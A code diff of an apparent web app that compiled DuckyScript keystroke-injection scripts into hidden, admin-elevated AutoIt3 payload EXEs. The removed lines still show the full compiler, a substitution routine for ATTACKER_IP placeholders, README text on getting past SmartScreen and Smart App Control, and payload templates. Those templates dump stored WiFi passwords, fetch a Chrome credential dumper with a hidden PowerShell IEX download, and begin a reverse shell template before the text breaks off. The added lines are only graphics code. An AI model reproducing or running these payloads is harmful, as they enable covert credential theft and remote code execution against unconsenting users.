-  if(id==='network') { refreshNetworkInfo(); }
-  if(id==='settings') { document.getElementById('settVault').textContent=S.vault.length; document.getElementById('sessionId').textContent=S.sessionId; detectWebGL(); checkBLEStatus(); }
-}
-
 // BOOT
 function runBoot() {
   const fill=document.getElementById('splashFill'); const status=document.getElementById('splashStatus'); const bootBtn=document.getElementById('bootBtn');
-  const msgs=['Initializing kernel…','Loading WebGL shaders…','Mounting compiler pipeline…','Syncing vault…','Calibrating neural uplink…','Checking BLE APIs…','Loading JSZip compiler…','Session ID generated…','All systems nominal.'];
+  if (!fill || !status || !bootBtn) return;
+  const msgs=['Initializing kernel…','Loading WebGL shaders…','Mounting compiler pipeline…','Syncing vault…','Calibrating neural uplink…','Checking BLE APIs…','Session ID generated…','All systems nominal.'];
   let i=0;
   const interval=setInterval(()=>{ const pct=Math.round(((i+1)/msgs.length)*100); fill.style.width=pct+'%'; status.textContent=msgs[i]||'Ready.'; i++; if(i>=msgs.length){ clearInterval(interval); bootBtn.style.display='inline-flex'; const prev=localStorage.getItem('lenlu_booted'); if(prev) setTimeout(bootEnter,400); } },320);
 }
 function bootEnter() {
   localStorage.setItem('lenlu_booted','1');
-  document.getElementById('splash').classList.add('hidden');
-  document.getElementById('app').classList.add('visible');
-  loadSession(); startTicker();
-  logIDE('// LENLU SC v3.0 FORGE — Session initialized','tl-ok');
-  logIDE(`// Session ID: ${S.sessionId}`,'tl-sys');
-  logIDE('// DuckyScript → AutoIt3 → Aut2Exe pipeline ready','tl-info');
-  logIDE('// Web Bluetooth API: '+(navigator.bluetooth?'AVAILABLE':'NOT AVAILABLE'),'tl-sys');
-  logFeed('Session started','tl-ok');
-  toast('LENLU SC v3.0 online — welcome back','ok');
-  updateStats(); animateTelemetry(); startSpectrum(); initHoloRing(); initStudioAnimations(); initTiltCards();
-  buildDuckRef(); buildAITags();
-  initTemplates();
-  document.getElementById('sessionId') && (document.getElementById('sessionId').textContent=S.sessionId);
+  const splash = document.getElementById('splash');
+  const app = document.getElementById('app');
+  if (splash) splash.classList.add('hidden');
+  if (app) app.classList.add('visible');
+  startTicker();
+  initHoloRing();
+  initStudioAnimations();
+  initTiltCards();
+  toast('LENLU SC Studio online','ok');
 }
 
-// SESSION
-function loadSession() {
-  try {
-    S.vault=JSON.parse(localStorage.getItem('lenlu_vault_v2')||'[]');
-    S.history=JSON.parse(localStorage.getItem('lenlu_history_v2')||'[]');
-    const stats=JSON.parse(localStorage.getItem('lenlu_stats')||'{}');
-    if(stats.compiled) S.stats.compiled=stats.compiled; if(stats.ai) S.stats.ai=stats.ai; if(stats.scans) S.stats.scans=stats.scans;
-    S.stats.vault=S.vault.length;
-    const src=localStorage.getItem('lenlu_src');
-    if(src){ const ed=document.getElementById('srcEditor'); if(ed){ ed.value=src; updateEditorCounts(); } }
-    const cfg=JSON.parse(localStorage.getItem('lenlu_settings')||'{}');
-    Object.assign(S.settings,cfg); applySettings();
-  } catch(e){}
-}
-function saveSession() {
-  try {
-    localStorage.setItem('lenlu_vault_v2',JSON.stringify(S.vault));
-    localStorage.setItem('lenlu_history_v2',JSON.stringify(S.history.slice(-50)));
-    localStorage.setItem('lenlu_stats',JSON.stringify(S.stats));
-    localStorage.setItem('lenlu_settings',JSON.stringify(S.settings));
-    const src=document.getElementById('srcEditor'); if(src&&S.settings.persist) localStorage.setItem('lenlu_src',src.value);
-  } catch(e){}
-}
-function wipeSession() {
-  if(!confirm('Wipe ALL session data? This cannot be undone.')) return;
-  ['lenlu_vault_v2','lenlu_history_v2','lenlu_stats','lenlu_settings','lenlu_src','lenlu_booted'].forEach(k=>localStorage.removeItem(k));
-  toast('Session data wiped','warn'); setTimeout(()=>location.reload(),1000);
+function startTicker() {
+  function tick(){ const el=document.getElementById('sysTime'); if(el) el.textContent=new Date().toLocaleTimeString('en',{hour12:false}); }
+  tick(); setInterval(tick,1000);
 }
 
-// SETTINGS
-function applySettings() {
-  const crt=document.querySelector('.crt'); if(crt) crt.style.display=S.settings.crt?'':'none';
-  Object.keys(S.settings).forEach(k=>{ const t=document.getElementById('tog-'+k); if(t){ t.classList.toggle('on',S.settings[k]); } });
-}
-function toggleSetting(k,el) {
-  S.settings[k]=!S.settings[k]; el.classList.toggle('on',S.settings[k]);
-  if(k==='crt'){ const crt=document.querySelector('.crt'); if(crt) crt.style.display=S.settings.crt?'':'none'; }
-  saveSession(); toast(k+' '+(S.settings[k]?'enabled':'disabled'),'info');
-}
-function detectWebGL() { const gl=document.createElement('canvas').getContext('webgl'); const el=document.getElementById('webglInfo'); if(el) el.textContent=gl?'WebGL '+gl.VERSION:'Not supported'; }
-function checkBLEStatus() { const el=document.getElementById('bleStatus'); if(!el) return; if(navigator.bluetooth) { navigator.bluetooth.getAvailability().then(a=>{ el.textContent=a?'Available':'Unavailable'; el.style.color=a?'var(--g)':'var(--amber)'; }).catch(()=>{ el.textContent='API Error'; }); } else { el.textContent='Not Supported'; el.style.color='var(--red)'; } }
-
-// STATS
-function updateStats() { ['compiled','ai','vault','scans'].forEach(k=>{ const el=document.getElementById('stat-'+k); if(el) animateCounter(el,0,S.stats[k],600); }); }
-function animateCounter(el,from,to,dur) { const start=performance.now(); function step(now){ const p=Math.min((now-start)/dur,1); el.textContent=Math.round(from+(to-from)*p); if(p<1) requestAnimationFrame(step); else el.textContent=to; } requestAnimationFrame(step); }
-function incStat(k) { S.stats[k]++; const el=document.getElementById('stat-'+k); if(el) el.textContent=S.stats[k]; saveSession(); }
-function startTicker() { function tick(){ const el=document.getElementById('sysTime'); if(el) el.textContent=new Date().toLocaleTimeString('en',{hour12:false}); } tick(); setInterval(tick,1000); const opEl=document.getElementById('compileCount'); setInterval(()=>{ if(opEl) opEl.textContent=S.stats.compiled+' ops'; },2000); }
-
-// ═══════════════════════════════════════════════
-//  DUCKYSCRIPT COMPILER (ENHANCED)
-// ═══════════════════════════════════════════════
-function compileStringToAutoIt(a) {
-  if (!a) return '""';
-  const regex = /http:\/\/yourserver\.com|yourserver\.com|YOUR_IP_HERE|YOUR_IP|ATTACKER_IP|your\.ip\.here/gi;
-  const escapeAu3 = str => str.replace(/"/g, '""');
+// ─── THREEJS & CANVAS GRAPHICS & ANIMATIONS ───
+let holoRenderer, holoScene, holoCamera, holoRings = [];
+function initHoloRing() {
+  const canvas = document.getElementById('holo-ring');
+  if (!canvas) return;
   
-  if (!regex.test(a)) {
-    return `"${escapeAu3(a)}"`;
-  }
-  regex.lastIndex = 0;
-  let lastIndex = 0;
-  let match;
-  const parts = [];
-  while ((match = regex.exec(a)) !== null) {
-    const literal = a.substring(lastIndex, match.index);
-    if (literal) {
-      parts.push(`"${escapeAu3(literal)}"`);
-    }
-    const matchedText = match[0].toLowerCase();
-    if (matchedText.startsWith('http://')) {
-      parts.push(`"http://" & @IPAddress1`);
-      try { logIDE(`[INFO] Substituted placeholder '${match[0]}' with dynamic HTTP URL resolved at runtime via @IPAddress1 macro.`, 'tl-info'); } catch(e){}
-    } else {
-      parts.push(`@IPAddress1`);
-      try { logIDE(`[INFO] Substituted placeholder '${match[0]}' with dynamic local IP resolved at runtime via @IPAddress1 macro.`, 'tl-info'); } catch(e){}
-    }
-    lastIndex = regex.lastIndex;
-  }
-  const remaining = a.substring(lastIndex);
-  if (remaining) {
-    parts.push(`"${escapeAu3(remaining)}"`);
-  }
-  return parts.join(' & ');
-}
-
-const DUCK_MAP = {
-  'REM': a=>`; ${a||''}`,
-  'GUI': a=>{ const k=(a||'').trim(); return `Send("{LWIN down}")\nSleep(80)\n${k?`Send("${k}")\nSleep(80)\n`:''}Send("{LWIN up}")\nSleep(150)`; },
-  'DELAY': a=>`Sleep(${parseInt(a)||100})`,
-  'STRING': a => `Send(${compileStringToAutoIt(a)})\nSleep(80)`,
-  'STRINGLN': a => `Send(${compileStringToAutoIt(a)})\nSleep(60)\nSend("{ENTER}")\nSleep(100)`,
-  'ENTER': ()=>`Send("{ENTER}")\nSleep(100)`,
-  'TAB': ()=>`Send("{TAB}")\nSleep(60)`,
-  'BACKSPACE': ()=>`Send("{BACKSPACE}")\nSleep(60)`,
-  'DELETE': ()=>`Send("{DELETE}")\nSleep(60)`,
-  'INSERT': ()=>`Send("{INSERT}")\nSleep(60)`,
-  'HOME': ()=>`Send("{HOME}")\nSleep(60)`,
-  'END': ()=>`Send("{END}")\nSleep(60)`,
-  'UPARROW': ()=>`Send("{UP}")\nSleep(60)`,
-  'DOWNARROW': ()=>`Send("{DOWN}")\nSleep(60)`,
-  'LEFTARROW': ()=>`Send("{LEFT}")\nSleep(60)`,
-  'RIGHTARROW': ()=>`Send("{RIGHT}")\nSleep(60)`,
-  'PAGEUP': ()=>`Send("{PGUP}")\nSleep(60)`,
-  'PAGEDOWN': ()=>`Send("{PGDN}")\nSleep(60)`,
-  'ESCAPE': ()=>`Send("{ESC}")\nSleep(60)`,
-  'SPACE': ()=>`Send(" ")\nSleep(40)`,
-  'CAPSLOCK': ()=>`Send("{CAPSLOCK}")\nSleep(60)`,
-  'PRINTSCREEN': ()=>`Send("{PRTSC}")\nSleep(100)`,
-  'SCROLLLOCK': ()=>`Send("{SCROLLLOCK}")\nSleep(60)`,
-  'PAUSE': ()=>`Send("{PAUSE}")\nSleep(60)`,
-  'BREAK': ()=>`Send("{BREAK}")\nSleep(60)`,
-  'NUMLOCK': ()=>`Send("{NUMLOCK}")\nSleep(60)`,
-  'F1': ()=>`Send("{F1}")\nSleep(60)`, 'F2': ()=>`Send("{F2}")\nSleep(60)`, 'F3': ()=>`Send("{F3}")\nSleep(60)`,
-  'F4': ()=>`Send("{F4}")\nSleep(60)`, 'F5': ()=>`Send("{F5}")\nSleep(60)`, 'F6': ()=>`Send("{F6}")\nSleep(60)`,
-  'F7': ()=>`Send("{F7}")\nSleep(60)`, 'F8': ()=>`Send("{F8}")\nSleep(60)`, 'F9': ()=>`Send("{F9}")\nSleep(60)`,
-  'F10': ()=>`Send("{F10}")\nSleep(60)`, 'F11': ()=>`Send("{F11}")\nSleep(60)`, 'F12': ()=>`Send("{F12}")\nSleep(60)`,
-  'CTRL': a=>`Send("^${a||''}")\nSleep(60)`,
-  'ALT': a=>`Send("!${a||''}")\nSleep(60)`,
-  'SHIFT': a=>`Send("+${a||''}")\nSleep(60)`,
-  'CTRL-ALT': a=>`Send("^!${a||''}")\nSleep(60)`,
-  'CTRL-SHIFT': a=>`Send("^+${a||''}")\nSleep(60)`,
-  'ALT-SHIFT': a=>`Send("!+${a||''}")\nSleep(60)`,
-  'CTRL-ALT-DEL': ()=>`Send("^!{DELETE}")\nSleep(60)`,
-  'ALT-F4': ()=>`Send("!{F4}")\nSleep(100)`,
-  'WINDOWS': ()=>`Send("{LWIN}")\nSleep(100)`,
-  'MENU': ()=>`Send("{APPSKEY}")\nSleep(60)`,
-  'MEDIA_PLAYPAUSE': ()=>`Send("{MEDIA_PLAY_PAUSE}")\nSleep(60)`,
-  'MEDIA_STOP': ()=>`Send("{MEDIA_STOP}")\nSleep(60)`,
-  'MEDIA_NEXT': ()=>`Send("{MEDIA_NEXT}")\nSleep(60)`,
-  'MEDIA_PREV': ()=>`Send("{MEDIA_PREV}")\nSleep(60)`,
-  'VOLUME_UP': ()=>`Send("{VOLUME_UP}")\nSleep(60)`,
-  'VOLUME_DOWN': ()=>`Send("{VOLUME_DOWN}")\nSleep(60)`,
-  'VOLUME_MUTE': ()=>`Send("{VOLUME_MUTE}")\nSleep(60)`,
-  'ATTACKMODE': a=>`; ATTACKMODE ${a||''} — hardware mode (ignored in software compilation)`,
-  'LED': a=>`; LED ${a||''} — hardware LED control (ignored in software compilation)`,
-};
-
-function compileDucky(src) {
-  const lines=src.split('\n');
-  const now=new Date().toLocaleString();
-  const output=[
-    `; ═══════════════════════════════════════════════`,
-    `; LENLU SC v3.0 — GENERATED AUTOIT3 ASSEMBLY`,
-    `; Generated : ${now}`,
-    `; Session   : ${S.sessionId}`,
-    `; Lines     : ${lines.length}`,
-    `; ═══════════════════════════════════════════════`,
-    `#NoTrayIcon`,
-    `#RequireAdmin`,
-    `#include <Misc.au3>`,
-    ``,
-    `; === PAYLOAD START ===`,
-    ``,
-  ];
-  const errors=[]; let lineNo=0; let defaultDelay=100;
-  
-  // Track commands to repeat them if REPEAT is called
-  const parsedCommands = [];
-
-  for(const raw of lines) {
-    lineNo++;
-    const line=raw.trim(); if(!line) { output.push(''); continue; }
-    const parts=line.split(/\s+/); const cmd=parts[0].toUpperCase(); const args=parts.slice(1).join(' ');
+  try {
+    const rect = canvas.parentElement.getBoundingClientRect();
+    const width = rect.width || 300;
+    const height = rect.height || 300;
     
-    if(cmd.startsWith('REM')) { 
-      output.push(`; ${line.substr(3).trim()}`); 
+    holoScene = new THREE.Scene();
+    holoCamera = new THREE.PerspectiveCamera(45, width / height, 0.1, 100);
+    holoCamera.position.z = 8;
+    
+    holoRenderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+    holoRenderer.setSize(width, height);
+    holoRenderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+    
+    const ringMaterials = [
+      new THREE.MeshBasicMaterial({ color: 0x00ff41, wireframe: true, transparent: true, opacity: 0.12 }),
+      new THREE.MeshBasicMaterial({ color: 0x08f7fe, wireframe: true, transparent: true, opacity: 0.18 }),
+      new THREE.MeshBasicMaterial({ color: 0x00ff41, wireframe: true, transparent: true, opacity: 0.3 })
+    ];
+    
+    const geometries = [
+      new THREE.TorusGeometry(2.3, 0.1, 8, 32),
+      new THREE.SphereGeometry(1.5, 12, 12),
+      new THREE.TorusGeometry(1.0, 0.05, 6, 24)
+    ];
+    
+    holoRings = [];
+    for (let i = 0; i < 3; i++) {
+      const mesh = new THREE.Mesh(geometries[i], ringMaterials[i]);
+      holoScene.add(mesh);
+      holoRings.push(mesh);
     }
-    else if(cmd==='DEFAULT_DELAY'||cmd==='DEFAULTDELAY') { 
-      defaultDelay=parseInt(args)||100; 
-      output.push(`; DEFAULT_DELAY = ${defaultDelay}ms`); 
+    
+    const partCount = 120;
+    const partGeom = new THREE.BufferGeometry();
+    const partPos = new Float32Array(partCount * 3);
+    for (let i = 0; i < partCount; i++) {
+      const theta = Math.random() * Math.PI * 2;
+      const phi = Math.acos((Math.random() * 2) - 1);
+      const dist = 1.0 + Math.random() * 1.3;
+      partPos[i * 3] = Math.sin(phi) * Math.cos(theta) * dist;
+      partPos[i * 3 + 1] = Math.sin(phi) * Math.sin(theta) * dist;
+      partPos[i * 3 + 2] = Math.cos(phi) * dist;
     }
-    else if(cmd==='REPEAT') { 
-      const n=parseInt(args)||1; 
-      if (parsedCommands.length > 0) {
-        const lastCmd = parsedCommands[parsedCommands.length - 1];
-        output.push(`; --- REPEAT LAST COMMAND ${n} TIMES ---`);
-        output.push(`For $i = 1 To ${n}`);
-        output.push(lastCmd);
-        output.push(`Next`);
-        output.push(`; -------------------------------------`);
-      } else {
-        errors.push({line:lineNo,msg:`REPEAT called before any valid command execution.`});
+    partGeom.setAttribute('position', new THREE.BufferAttribute(partPos, 3));
+    const partMat = new THREE.PointsMaterial({ color: 0x00ff41, size: 0.035, transparent: true, opacity: 0.8 });
+    const partPoints = new THREE.Points(partGeom, partMat);
+    holoScene.add(partPoints);
+    holoRings.push(partPoints);
+    
+    const resizeObserver = new ResizeObserver(entries => {
+      for (let entry of entries) {
+        const w = entry.contentRect.width || 300;
+        const h = entry.contentRect.height || 300;
+        holoCamera.aspect = w / h;
+        holoCamera.updateProjectionMatrix();
+        holoRenderer.setSize(w, h);
       }
-    }
-    else if(cmd==='HOLD') { 
-      const k=args.trim().toUpperCase(); 
-      const instruction = `Send("{${k} down}")\nSleep(200)`;
-      output.push(instruction); 
-      parsedCommands.push(instruction);
-    }
-    else if(cmd==='RELEASE') { 
-      const k=args.trim().toUpperCase(); 
-      const instruction = `Send("{${k} up}")\nSleep(100)`;
-      output.push(instruction); 
-      parsedCommands.push(instruction);
-    }
-    else if(cmd==='INJECT_MOD') { 
-      output.push(`; INJECT_MOD ${args}`); 
-    }
-    else if(DUCK_MAP[cmd]) { 
-      let instruction = DUCK_MAP[cmd](args);
-      if(defaultDelay>0) {
-        instruction += `\nSleep(${defaultDelay})`;
+    });
+    resizeObserver.observe(canvas.parentElement);
+    
+    function animateHolo() {
+      if (S.settings.particles) {
+        holoRings[0].rotation.x += 0.003;
+        holoRings[0].rotation.y += 0.005;
+        
+        holoRings[1].rotation.x -= 0.004;
+        holoRings[1].rotation.y += 0.002;
+        
+        holoRings[2].rotation.y -= 0.008;
+        holoRings[2].rotation.z += 0.004;
+        
+        if (holoRings[3]) {
+          holoRings[3].rotation.y += 0.001;
+        }
+        
+        holoRenderer.render(holoScene, holoCamera);
       }
-      output.push(instruction);
-      parsedCommands.push(instruction);
+      requestAnimationFrame(animateHolo);
     }
-    else { 
-      errors.push({line:lineNo,msg:`Unknown command: "${cmd}"`}); 
-      output.push(`; [ERR L${lineNo}] Unknown: ${cmd}`); 
-    }
+    animateHolo();
+    
+  } catch (err) {
+    console.error('Failed to init ThreeJS Holo Ring:', err);
   }
-  output.push('', '; === PAYLOAD END ===');
-  return { code: output.join('\n'), errors };
 }
 
-// COMPILE
-function compilePayload() {
-  const src=document.getElementById('srcEditor').value.trim();
-  if(!src){ toast('No source to compile','warn'); return; }
-  logIDE('Compiling payload…','tl-info'); playTone(440,'sawtooth',0.06);
-  const { code, errors }=compileDucky(src);
-  const out=document.getElementById('outViewer'); out.textContent=code;
-  updateOutCounts(code);
-  if(errors.length>0) { errors.forEach(e=>logIDE(`⚠ Line ${e.line}: ${e.msg}`,'tl-warn')); toast(`Compiled with ${errors.length} warning(s)`,'warn'); }
-  else { logIDE(`✓ Compilation successful — ${code.split('\n').length} lines output`,'tl-ok'); toast('Compilation successful','ok'); }
-  incStat('compiled'); logFeed(`Compiled payload (${src.split('\n').length}L → ${code.split('\n').length}L)`,'tl-ok');
-  if(S.settings.hist) { S.history.unshift({id:Date.now(),ts:new Date().toLocaleString(),src,assembly:code,diag:errors.map(e=>`L${e.line}: ${e.msg}`).join('\n')||'OK'}); saveSession(); }
-  playTone(880,'sine',0.1);
-}
-
-function quickCompile() {
-  const src=document.getElementById('qkInput').value.trim(); if(!src) return;
-  const log=document.getElementById('qkLog'); log.innerHTML='';
-  const add=(m,c='tl-sys')=>{ const el=document.createElement('div'); el.className=`tl-line ${c}`; el.innerHTML=`<span class="tl-ts">[${new Date().toLocaleTimeString('en',{hour12:false})}]</span><span>${m}</span>`; log.appendChild(el); log.scrollTop=log.scrollHeight; };
-  add('Compiling…','tl-info');
-  const { code, errors }=compileDucky(src);
-  if(errors.length) errors.forEach(e=>add(`⚠ L${e.line}: ${e.msg}`,'tl-warn'));
-  else add(`✓ ${code.split('\n').length} lines output`,'tl-ok');
-  document.getElementById('srcEditor').value=src; document.getElementById('outViewer').textContent=code;
-  switchView('compiler',document.querySelector('[data-view=compiler]')); toast('Quick compile done','ok');
-}
-
-// EXE PACKAGE BUILDER (SciTE / Aut2Exe)
-async function buildEXEPackage(arch) {
-  const au3Code=document.getElementById('outViewer').textContent;
-  if(!au3Code||au3Code.trim().startsWith('; Compiled assembly will appear here')){ toast('No compiled assembly. Run compiler first.','warn'); return; }
-
-  const bat=`@echo off
-title LENLU SC - AutoIt3 Compiler (${arch.toUpperCase()})
-color 0A
-cls
-echo.
-echo  =========================================
-echo   LENLU SC v3.0 // AutoIt3 EXE Compiler
-echo   Architecture: ${arch.toUpperCase()}
-echo  =========================================
-echo.
-
-SET "AU3EXE="
-IF EXIST "C:\\Program Files (x86)\\AutoIt3\\Aut2Exe\\Aut2Exe.exe" SET "AU3EXE=C:\\Program Files (x86)\\AutoIt3\\Aut2Exe\\Aut2Exe.exe"
-IF EXIST "C:\\Program Files\\AutoIt3\\Aut2Exe\\Aut2Exe.exe" SET "AU3EXE=C:\\Program Files\\AutoIt3\\Aut2Exe\\Aut2Exe.exe"
-IF EXIST "%LOCALAPPDATA%\\Programs\\AutoIt3\\Aut2Exe\\Aut2Exe.exe" SET "AU3EXE=%LOCALAPPDATA%\\Programs\\AutoIt3\\Aut2Exe\\Aut2Exe.exe"
-
-IF NOT DEFINED AU3EXE (
-  echo  [ERROR] AutoIt3 not found!
-  echo.
-  echo  Install AutoIt3 from: https://www.autoitscript.com/
-  echo  Then re-run this script.
-  echo.
-  pause & exit /b 1
-)
-echo  [OK] Found: %AU3EXE%
-echo.
-echo  Compiling payload.au3 to payload_${arch}.exe...
-echo.
-
-"%AU3EXE%" /in "%~dp0payload.au3" /out "%~dp0payload_${arch}.exe"${arch==='x64'?' /x64':''} /nopack /comp 2
-
-IF EXIST "%~dp0payload_${arch}.exe" (
-  echo  =========================================
-  echo   SUCCESS! payload_${arch}.exe created.
-  echo  =========================================
-  FOR %%F IN ("%~dp0payload_${arch}.exe") DO echo   Size: %%~zF bytes
-) ELSE (
-  echo  [FAILED] Check payload.au3 for syntax errors.
-  echo  Tip: Open payload.au3 in SciTE and press Ctrl+F7
-)
-echo.
-pause`;
-
-  const readme=`LENLU SC v3.0 - AutoIt3 Payload Compiler Package
-==================================================
-
-CONTENTS:
-  payload.au3            AutoIt3 script (DuckyScript compiled)
-  compile_${arch}.bat         Compile to ${arch.toUpperCase()} EXE (run this)
-  scite_guide.txt        SciTE editor compile instructions
-  README.txt             This file
-
-REQUIREMENTS:
-  AutoIt3 (includes SciTE + Aut2Exe):
-  https://www.autoitscript.com/site/autoit/downloads/
-
-QUICK START:
-  1. Install AutoIt3
-  2. Double-click compile_${arch}.bat
-  3. payload_${arch}.exe will be created in this folder
-
-TROUBLESHOOTING (SMART APP CONTROL BLOCKED / WINDOWS BLOCKS RUNNING THE BAT):
-  Because batch files downloaded from browsers are marked as "Mark-of-the-Web",
-  Windows Smart App Control or SmartScreen might block running compile_${arch}.bat.
+// Background starfield
+let bgRenderer, bgScene, bgCamera, bgPoints;
+function initStars() {
+  const canvas = document.getElementById('bgCanvas');
+  if (!canvas) return;
   
-  To fix/bypass this:
-  - Right-click compile_${arch}.bat -> Properties -> Check 'Unblock' box at the bottom -> Apply.
-  - Or, open PowerShell in this folder and run:
-      Unblock-File .\compile_${arch}.bat
-  - Alternatively, compile payload.au3 directly inside SciTE Editor by pressing Ctrl+F7.
-
-SCITE COMPILE (MANUAL - BYPASSES SYSTEM BLOCKS):
-  1. Open payload.au3 in SciTE Script Editor
-  2. Tools menu > Compile Script (or Ctrl+F7)
-  3. Select Architecture: ${arch.toUpperCase()}
-  4. Click Compile
-
-AUT2EXE COMMAND LINE:
-  "C:\\Program Files (x86)\\AutoIt3\\Aut2Exe\\Aut2Exe.exe" /in payload.au3 /out payload_${arch}.exe${arch==='x64'?' /x64':''}
-
-LEGAL NOTICE:
-  Use only on systems you own or have written permission to test.
-
-Generated: ${new Date().toLocaleString()}
-Session: ${S.sessionId}`;
-
-  const sciteGuide=`SciTE Script Editor - Compile Guide
-======================================
-
-1. Install AutoIt3 (includes SciTE):
-   https://www.autoitscript.com/site/autoit/downloads/
-
-2. Open SciTE Script Editor (AutoIt3 > SciTE Script Editor)
-
-3. Open payload.au3 in SciTE
-
-4. Compile using any of these methods:
-   - Menu: Tools > Compile Script
-   - Keyboard: Ctrl+F7
-   - Right-click in editor > Compile
-
-5. In the Aut2Exe dialog:
-   - Source:      payload.au3
-   - Destination: payload_${arch}.exe
-   - Architecture: ${arch.toUpperCase()} (${arch==='x64'?'64-bit':'32-bit'})
-   - Compression: LZMA (optional, smaller file)
-   - Icon:        (optional - add .ico file for custom icon)
-
-6. Click Compile button
-
-SCITE TIPS:
-  - F5  = Run script (test without compiling)
-  - F7  = Run in debugger
-  - Ctrl+F7 = Compile to EXE
-
-NOTE: #RequireAdmin in payload.au3 means EXE will request
-elevation (UAC prompt) on launch. Remove this line if not needed.`;
-
-  logIDE(`Building EXE package (${arch.toUpperCase()})…`,'tl-info');
   try {
-    if(typeof JSZip==='undefined') { toast('JSZip not loaded — downloading .au3 only','warn'); downloadTxt(au3Code,'payload.au3'); return; }
-    const zip=new JSZip();
-    zip.file('payload.au3',au3Code);
-    zip.file(`compile_${arch}.bat`,bat);
-    zip.file('scite_guide.txt',sciteGuide);
-    zip.file('README.txt',readme);
-    const blob=await zip.generateAsync({type:'blob',compression:'DEFLATE',compressionOptions:{level:6}});
-    const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url;
-    a.download=`lenlu_payload_${arch}_package.zip`; document.body.appendChild(a); a.click(); a.remove();
-    setTimeout(()=>URL.revokeObjectURL(url),1000);
-    logIDE(`✓ Package built: lenlu_payload_${arch}_package.zip`,'tl-ok');
-    toast(`EXE Package downloaded (${arch.toUpperCase()})! Unzip and run compile_${arch}.bat`,'ok',5000);
-    incStat('compiled');
-    logFeed(`EXE package built: ${arch.toUpperCase()}`,'tl-ok');
-  } catch(e) { toast('Package build failed: '+e.message,'err'); logIDE('Package build error: '+e.message,'tl-err'); }
-}
-
-// LINT
-function lintSource(val) {
-  updateEditorCounts();
-  if(!S.settings.lint) return;
-  const lines=val.split('\n'); let errs=0;
-  const known=Object.keys(DUCK_MAP).concat(['STRINGLN','DEFAULT_DELAY','DEFAULTDELAY','REPEAT','HOLD','RELEASE','INJECT_MOD']);
-  for(const l of lines) { const t=l.trim(); if(!t) continue; const cmd=t.split(/\s+/)[0].toUpperCase(); if(!known.includes(cmd)&&!cmd.startsWith('REM')&&!cmd.startsWith(';')) errs++; }
-  const badge=document.getElementById('lintStatus');
-  if(badge) { if(errs>0){ badge.className='badge badge-r lint-err'; badge.textContent=`${errs} err`; } else { badge.className='badge badge-g lint-ok'; badge.textContent='OK'; } }
-  if(S.settings.persist) localStorage.setItem('lenlu_src',val);
-}
-function updateEditorCounts() { const ed=document.getElementById('srcEditor'); if(!ed) return; document.getElementById('srcLines').textContent=ed.value.split('\n').length; document.getElementById('srcChars').textContent=ed.value.length; }
-function updateOutCounts(txt) { document.getElementById('outLines').textContent=txt.split('\n').length; document.getElementById('outChars').textContent=txt.length; }
-function clearEditor() { document.getElementById('srcEditor').value=''; document.getElementById('outViewer').textContent='; // cleared'; updateEditorCounts(); toast('Editor cleared','info'); }
-function clearLog() { document.getElementById('ideLog').innerHTML=''; }
-function copySource() { navigator.clipboard.writeText(document.getElementById('srcEditor').value).then(()=>toast('Source copied','ok')); }
-function copyOutput() { navigator.clipboard.writeText(document.getElementById('outViewer').textContent).then(()=>toast('Assembly copied','ok')); }
-async function pasteSource() { try { const t=await navigator.clipboard.readText(); document.getElementById('srcEditor').value+=t; updateEditorCounts(); toast('Pasted','ok'); } catch(e){ toast('Clipboard access denied','err'); } }
-function exportAu3() { const c=document.getElementById('outViewer').textContent; downloadTxt(c,'payload.au3'); }
-function downloadTxt(content,filename) { if(!content) { toast('Nothing to download','warn'); return; } const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([content],{type:'text/plain'})); a.download=filename; document.body.appendChild(a); a.click(); a.remove(); toast('Downloaded '+filename,'ok'); }
-let parsedTemplates = getFallbackTemplates();
-
-function getFallbackTemplates() {
-  return [
-    {
-      id: 'PAYLOAD_1',
-      name: 'Open Notepad and Type Message',
-      description: 'Opens Notepad on the target machine and types a greeting message. Perfect for testing keyboard injection speed and verifying correct execution.',
-      code: 'DELAY 1500\nGUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRINGLN Welcome to the DuckyScript Payload Collection!\nSTRING This is for authorized testing only.'
-    },
-    {
-      id: 'PAYLOAD_2',
-      name: 'Classic Rickroll',
-      description: 'Opens the system run dialog and launches the classic Rickroll YouTube video in the default browser.',
-      code: 'DELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER'
-    },
-    {
-      id: 'PAYLOAD_3',
-      name: 'Matrix Rain Effect',
-      description: 'Opens a command prompt (CMD) and starts a green matrix-style random number rain screen effect.',
-      code: 'GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING color 02 && echo %random%%random%%random%%random%%random%%random%%random%%random%%random% && goto :a\nENTER'
-    },
-    {
-      id: 'PAYLOAD_10',
-      name: 'Full System Info Dump',
-      description: 'Gathers full hardware, operating system, network, and user configuration details using PowerShell, saves it to a temp file, and displays it in Notepad.',
-      code: 'GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\systeminfo.txt; whoami >> C:\\temp\\systeminfo.txt; ipconfig /all >> C:\\temp\\systeminfo.txt\nENTER\nDELAY 500\nSTRING notepad C:\\temp\\systeminfo.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_11',
-      name: 'WiFi Passwords Exfiltration',
-      description: 'Enumerates all stored WiFi profiles on the target system and displays their clear-text passwords in a temporary log file using netsh.',
-      code: 'GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING netsh wlan show profiles > C:\\temp\\wifi.txt && for /f "tokens=2 delims=:" %a in (\'netsh wlan show profiles\') do netsh wlan show profile name="%a" key=clear >> C:\\temp\\wifi.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_30',
-      name: 'SharpChrome Password Dump',
-      description: 'Ethical penetration testing utility. Leverages SharpChrome compiled binaries from a public repository to dump Chrome browser saved credentials (for authorized audits).',
-      code: 'GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 800\nSTRING IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe\'); SharpChrome.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_50',
-      name: 'PowerShell TCP Reverse Shell',
